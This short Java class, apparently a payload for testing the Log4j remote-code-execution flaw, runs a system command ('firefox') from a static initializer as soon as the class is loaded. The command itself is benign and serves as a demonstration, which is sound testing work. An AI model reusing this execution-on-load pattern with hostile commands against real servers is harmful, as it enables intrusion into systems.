public class Log4jRCETest {

	static {
		try {
			System.out.println("EXECUTING MALICIOUS CODE...");
			Runtime.getRuntime().exec("firefox").waitFor();
			
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println("FAILED TO OPEN PROGRAM");
		}
		
	}
}
